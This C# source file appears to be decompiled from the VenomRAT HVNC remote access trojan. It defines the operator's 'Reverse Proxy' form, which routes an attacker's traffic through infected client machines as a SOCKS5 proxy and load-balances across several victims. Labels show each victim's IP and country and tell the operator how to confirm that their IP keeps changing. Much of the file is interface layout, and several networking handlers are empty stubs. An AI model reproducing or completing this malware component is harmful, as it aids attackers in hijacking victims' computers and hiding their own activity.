using System;
using System.ComponentModel;
using System.Globalization;
using System.Net.Sockets;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Server;
using VenomRAT_HVNC.Server;
using VenomRAT_HVNC.Server.Connection;
using VenomRAT_HVNC.Server.Helper;

namespace VenomRAT_HVNC.Quasar.Server.Forms
{
    internal class FrmRevProxy : Form
    {
        private readonly Clients[] _clients;

        private ReverseProxyClient[] _openConnections;

        private Client[] clients;

        private static readonly string[] Sizes = new string[6] { "B", "KB", "MB", "GB", "TB", "PB" };

        private IContainer components;

        private Button btnStart;

        private Label lblLocalServerPort;

        private NumericUpDown nudServerPort;

        private TabControl tabCtrl;

        private TabPage tabPage1;

        private ColumnHeader columnHeader1;

        private ColumnHeader columnHeader2;

        private ColumnHeader columnHeader3;

        private ColumnHeader columnHeader4;

        private ColumnHeader columnHeader5;

        private Button btnStop;

        private Label lblProxyInfo;

        private ContextMenuStrip contextMenuStrip;

        private ToolStripMenuItem killConnectionToolStripMenuItem;

        private ColumnHeader columnHeader6;

        private ColumnHeader columnHeader7;

        private Label label1;

        private Label lblLoadBalance;

        private Helper.AeroListView lstConnections;

        private Guna2BorderlessForm guna2BorderlessForm1;

        public FrmRevProxy(Clients[] clients)
        {
            _clients = clients;
            RegisterMessageHandler();
            InitializeComponent();
        }

        private void RegisterMessageHandler()
        {
        }

        private void UnregisterMessageHandler()
        {
        }

        private void ClientDisconnected(Clients client, bool connected)
        {
            if (!connected)
            {
                Invoke(new MethodInvoker(base.Close));
            }
        }

        private void FrmReverseProxy_Load(object sender, EventArgs e)
        {
            if (_clients.Length > 1)
            {
                Text = "Reverse Proxy [Load-Balancer is active]";
                lblLoadBalance.Text = "The Load Balancer is active, " + _clients.Length + " clients will be used as proxy\r\nKeep refreshing at www.ipchicken.com to see if your ip address will keep changing, if so, it works";
            }
            else if (_clients.Length == 1)
            {
                lblLoadBalance.Text = "The Load Balancer is not active, only 1 client is used, select multiple clients to activate the load balancer";
            }
            nudServerPort.Value = global::VenomRAT_HVNC.Server.Properties.Settings.Default.ReverseProxyPort;
        }

        private void FrmReverseProxy_FormClosing(object sender, FormClosingEventArgs e)
        {
            global::VenomRAT_HVNC.Server.Properties.Settings.Default.ReverseProxyPort = GetPortSafe();
            UnregisterMessageHandler();
        }

        private void ConnectionChanged(object sender, ReverseProxyClient[] proxyClients)
        {
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            try
            {
                if (GetPortSafe() == 0)
                {
                    MessageBox.Show("Please enter a valid port > 0.", "Please enter a valid port", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                }
                else
                {
                    ToggleConfigurationButtons(started: true);
                }
            }
            catch (SocketException ex)
            {
                if (ex.ErrorCode == 10048)
                {
                    MessageBox.Show("The port is already in use.", "Listen Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                }
                else
                {
                    MessageBox.Show($"An unexpected socket error occurred: {ex.Message}\n\nError Code: {ex.ErrorCode}", "Unexpected Listen Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                }
            }
            catch (Exception ex2)
            {
                MessageBox.Show("An unexpected error occurred: " + ex2.Message, "Unexpected Listen Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
            }
        }

        private ushort GetPortSafe()
        {
            string s = nudServerPort.Value.ToString(CultureInfo.InvariantCulture);
            if (ushort.TryParse(s, out var result))
            {
                return result;
            }
            return 0;
        }

        private void ToggleConfigurationButtons(bool started)
        {
            btnStart.Enabled = !started;
            nudServerPort.Enabled = !started;
            btnStop.Enabled = started;
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            ToggleConfigurationButtons(started: false);
        }

        private void nudServerPort_ValueChanged(object sender, EventArgs e)
        {
            lblProxyInfo.Text = $"Connect to this SOCKS5 Proxy: 127.0.0.1:{nudServerPort.Value} (no user/pass)";
        }

        private void LvConnections_RetrieveVirtualItem(object sender, RetrieveVirtualItemEventArgs e)
        {
        }

        public static string GetHumanReadableFileSize(long size)
        {
            double num = size;
            int num2 = 0;
            while (num >= 1024.0 && num2 + 1 < Sizes.Length)
            {
                num2++;
                num /= 1024.0;
            }
            return $"{num:0.##} {Sizes[num2]}";
        }

        private void killConnectionToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && components != null)
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            components = new System.ComponentModel.Container();
            btnStart = new System.Windows.Forms.Button();
            lblLocalServerPort = new System.Windows.Forms.Label();
            nudServerPort = new System.Windows.Forms.NumericUpDown();
            tabCtrl = new System.Windows.Forms.TabControl();
            tabPage1 = new System.Windows.Forms.TabPage();
            lstConnections = new Quasar.Server.Helper.AeroListView();
            columnHeader6 = new System.Windows.Forms.ColumnHeader();
            columnHeader7 = new System.Windows.Forms.ColumnHeader();
            columnHeader1 = new System.Windows.Forms.ColumnHeader();
            columnHeader2 = new System.Windows.Forms.ColumnHeader();
            columnHeader3 = new System.Windows.Forms.ColumnHeader();
            columnHeader4 = new System.Windows.Forms.ColumnHeader();
            columnHeader5 = new System.Windows.Forms.ColumnHeader();
            contextMenuStrip = new System.Windows.Forms.ContextMenuStrip(components);
            killConnectionToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            btnStop = new System.Windows.Forms.Button();
            lblProxyInfo = new System.Windows.Forms.Label();
            label1 = new System.Windows.Forms.Label();
            lblLoadBalance = new System.Windows.Forms.Label();
            guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
            ((System.ComponentModel.ISupportInitialize)nudServerPort).BeginInit();
            tabCtrl.SuspendLayout();
            tabPage1.SuspendLayout();
            contextMenuStrip.SuspendLayout();
            SuspendLayout();
            btnStart.Location = new System.Drawing.Point(243, 14);
            btnStart.Name = "btnStart";
            btnStart.Size = new System.Drawing.Size(114, 23);
            btnStart.TabIndex = 0;
            btnStart.Text = "Start Listening";
            btnStart.UseVisualStyleBackColor = true;
            btnStart.Click += new System.EventHandler(btnStart_Click);
            lblLocalServerPort.AutoSize = true;
            lblLocalServerPort.Location = new System.Drawing.Point(22, 17);
            lblLocalServerPort.Name = "lblLocalServerPort";
            lblLocalServerPort.Size = new System.Drawing.Size(91, 13);
            lblLocalServerPort.TabIndex = 1;
            lblLocalServerPort.Text = "Local Server Port";
            nudServerPort.Location = new System.Drawing.Point(117, 15);
            nudServerPort.Maximum = new decimal(new int[4] { 65534, 0, 0, 0 });
            nudServerPort.Minimum = new decimal(new int[4] { 1, 0, 0, 0 });
            nudServerPort.Name = "nudServerPort";
            nudServerPort.Size = new System.Drawing.Size(120, 22);
            nudServerPort.TabIndex = 2;
            nudServerPort.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            nudServerPort.Value = new decimal(new int[4] { 3128, 0, 0, 0 });
            nudServerPort.ValueChanged += new System.EventHandler(nudServerPort_ValueChanged);
            tabCtrl.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
            tabCtrl.Controls.Add(tabPage1);
            tabCtrl.Location = new System.Drawing.Point(26, 115);
            tabCtrl.Name = "tabCtrl";
            tabCtrl.SelectedIndex = 0;
            tabCtrl.Size = new System.Drawing.Size(736, 274);
            tabCtrl.TabIndex = 3;
            tabPage1.Controls.Add(lstConnections);
            tabPage1.Location = new System.Drawing.Point(4, 22);
            tabPage1.Name = "tabPage1";
            tabPage1.Padding = new System.Windows.Forms.Padding(3);
            tabPage1.Size = new System.Drawing.Size(728, 248);
            tabPage1.TabIndex = 0;
            tabPage1.Text = "Open Connections";
            tabPage1.UseVisualStyleBackColor = true;
            lstConnections.Columns.AddRange(new System.Windows.Forms.ColumnHeader[7] { columnHeader6, columnHeader7, columnHeader1, columnHeader2, columnHeader3, columnHeader4, columnHeader5 });
            lstConnections.ContextMenuStrip = contextMenuStrip;
            lstConnections.Dock = System.Windows.Forms.DockStyle.Fill;
            lstConnections.FullRowSelect = true;
            lstConnections.GridLines = true;
            lstConnections.HideSelection = false;
            lstConnections.Location = new System.Drawing.Point(3, 3);
            lstConnections.Name = "lstConnections";
            lstConnections.Size = new System.Drawing.Size(722, 242);
            lstConnections.TabIndex = 0;
            lstConnections.UseCompatibleStateImageBehavior = false;
            lstConnections.View = System.Windows.Forms.View.Details;
            lstConnections.VirtualMode = true;
            lstConnections.RetrieveVirtualItem += new System.Windows.Forms.RetrieveVirtualItemEventHandler(LvConnections_RetrieveVirtualItem);
            columnHeader6.Text = "Client IP";
            columnHeader6.Width = 106;
            columnHeader7.Text = "Client Country";
            columnHeader7.Width = 106;
            columnHeader1.Text = "Target Server";
            columnHeader1.Width = 135;
            columnHeader2.Text = "Target Port";
            columnHeader2.Width = 68;
            columnHeader3.Text = "Total Received";
            columnHeader3.Width = 105;
            columnHeader4.Text = "Total Sent";
            columnHeader4.Width = 95;
            columnHeader5.Text = "Proxy Type";
            columnHeader5.Width = 90;
            contextMenuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { killConnectionToolStripMenuItem });
            contextMenuStrip.Name = "contextMenuStrip1";
            contextMenuStrip.Size = new System.Drawing.Size(156, 26);
            killConnectionToolStripMenuItem.Name = "killConnectionToolStripMenuItem";
            killConnectionToolStripMenuItem.Size = new System.Drawing.Size(155, 22);
            killConnectionToolStripMenuItem.Text = "Kill Connection";
            killConnectionToolStripMenuItem.Click += new System.EventHandler(killConnectionToolStripMenuItem_Click);
            btnStop.Enabled = false;
            btnStop.Location = new System.Drawing.Point(363, 14);
            btnStop.Name = "btnStop";
            btnStop.Size = new System.Drawing.Size(114, 23);
            btnStop.TabIndex = 4;
            btnStop.Text = "Stop Listening";
            btnStop.UseVisualStyleBackColor = true;
            btnStop.Click += new System.EventHandler(btnStop_Click);
            lblProxyInfo.AutoSize = true;
            lblProxyInfo.Location = new System.Drawing.Point(23, 51);
            lblProxyInfo.Name = "lblProxyInfo";
            lblProxyInfo.Size = new System.Drawing.Size(312, 13);
            lblProxyInfo.TabIndex = 5;
            lblProxyInfo.Text = "Connect to this SOCKS5 Proxy: 127.0.0.1:3128 (no user/pass)";
            label1.AutoSize = true;
            label1.Location = new System.Drawing.Point(23, 67);
            label1.Name = "label1";
            label1.Size = new System.Drawing.Size(404, 13);
            label1.TabIndex = 6;
            label1.Text = "All the DNS Queries will be executed at the remote client to reduce DNS Leaks";
            lblLoadBalance.AutoSize = true;
            lblLoadBalance.Location = new System.Drawing.Point(23, 84);
            lblLoadBalance.Name = "lblLoadBalance";
            lblLoadBalance.Size = new System.Drawing.Size(104, 13);
            lblLoadBalance.TabIndex = 7;
            lblLoadBalance.Text = "[Load Balance Info]";
            guna2BorderlessForm1.AnimateWindow = true;
            guna2BorderlessForm1.AnimationType = Guna.UI2.WinForms.Guna2BorderlessForm.AnimateWindowType.AW_HOR_POSITIVE;
            guna2BorderlessForm1.ContainerControl = this;
            guna2BorderlessForm1.DockIndicatorColor = System.Drawing.Color.FromArgb(8, 104, 81);
            guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(8, 104, 81);
            base.AutoScaleDimensions = new System.Drawing.SizeF(96f, 96f);
            base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
            base.ClientSize = new System.Drawing.Size(777, 402);
            base.Controls.Add(lblLoadBalance);
            base.Controls.Add(label1);
            base.Controls.Add(lblProxyInfo);
            base.Controls.Add(btnStop);
            base.Controls.Add(tabCtrl);
            base.Controls.Add(nudServerPort);
            base.Controls.Add(lblLocalServerPort);
            base.Controls.Add(btnStart);
            Font = new System.Drawing.Font("Segoe UI", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            base.Name = "FrmReverseProxy";
            base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            Text = "Reverse Proxy []";
            base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(FrmReverseProxy_FormClosing);
            base.Load += new System.EventHandler(FrmReverseProxy_Load);
            ((System.ComponentModel.ISupportInitialize)nudServerPort).EndInit();
            tabCtrl.ResumeLayout(false);
            tabPage1.ResumeLayout(false);
            contextMenuStrip.ResumeLayout(false);
            ResumeLayout(false);
            PerformLayout();
        }
    }
}
